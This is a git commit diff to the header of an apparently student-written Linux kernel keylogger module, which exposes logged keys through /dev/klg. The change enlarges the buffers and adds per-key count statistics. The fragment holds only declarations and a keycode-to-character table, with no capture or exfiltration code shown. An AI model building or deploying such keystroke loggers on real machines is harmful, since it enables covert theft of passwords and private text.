ae0e5efe6dd065b1f57947193daa52f184d57892
lukejo2 <johan373@d.umn.edu>
2015-04-29 17:23:00 -0500

    Update klogger.h
    Produces stats about the number of times a key was logged.

--- klogger.h
+++ klogger.h
@@ -8,17 +8,25 @@
 #include <linux/input.h>
 
 #define KLG_MAJOR   60
-#define BUFF_LENGTH 1024
+#define BUFF_LENGTH 1000000
+#define INDEX_LENGTH 52
 #define FIRST_CD    KEY_1
 #define LAST_CD     KEY_SLASH
 
-char buffer[BUFF_LENGTH+1];
-char* bptr = buffer;
+char buffer[BUFF_LENGTH+1];		//literally the file /dev/klg
+char readBuffer[BUFF_LENGTH+1];	//buffer for reading the keys
+char* rdptr = readBuffer;		//pointer to the read buffer
+char* bptr = buffer;			//pointer to the buffer buffer
 const char* endptr = (buffer+sizeof(buffer)-1);
+
 const char ch_table[] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r',
 		   '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
 		   'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
-		   'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'};
+		   'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'}; //the "keyboard" ording is by the klg author's design
+int int_table[] = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 
+			  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 
+			  0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
+			  0, 0, 0, 0, 0, 0, 0, 0, 0, 0}; //apparently it needs to be stupidly coded like this in order to initialize everything.
 
 inline char get_ascii(int code) {
 	if((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return 'X';
